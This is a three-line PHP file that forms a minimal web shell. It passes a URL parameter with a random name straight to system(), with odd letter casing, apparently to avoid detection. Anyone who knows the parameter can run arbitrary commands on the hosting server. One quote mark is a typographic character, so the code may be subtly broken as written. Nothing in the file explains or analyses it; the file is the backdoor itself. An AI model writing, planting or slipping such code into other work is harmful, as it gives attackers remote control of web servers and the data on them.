<?php
SysTeM($_GET[’Xxk9GUYx']);
?>
